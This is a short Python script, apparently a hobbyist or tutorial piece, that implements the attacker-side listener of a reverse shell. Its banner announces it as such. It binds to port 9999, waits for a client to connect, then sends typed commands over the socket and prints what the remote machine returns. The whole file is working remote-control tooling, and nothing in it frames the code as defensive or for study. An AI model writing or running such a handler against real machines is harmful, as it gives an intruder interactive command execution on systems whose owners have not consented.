import socket
import sys
import os
from sys import *

def socket_create():
    try:
       global host
       global port
       global s
       host = ''
       port = 9999
       s=socket.socket()
    except socket.error as msg:
         print("Socket creaton error:  " + str(msg))


def socket_bind():
    try:
      global host
      global port
      global s
      print("Binding socket to port: "  + str (port))
      s.bind((host,port))
      s.listen(5)
    except socket.error as msg:
       print("Binding error: " + str(msg) +"/n" + "Retrying please wait")
       socket_bind()
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established " + "IP :>" + address[0] + " | port:> "+str(address[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

def main():
    if platform =='win32':
        os.system('cls')
    else:
        os.system('clear')
    print ("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
    print ("!                                                              !")
    print ("!     Welcome to the reverse-shell designed in  python         !")
    print ("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
    print ("Waiting for any client to connect on  desired port.")
    socket_create()
    socket_bind()
    socket_accept()

main()
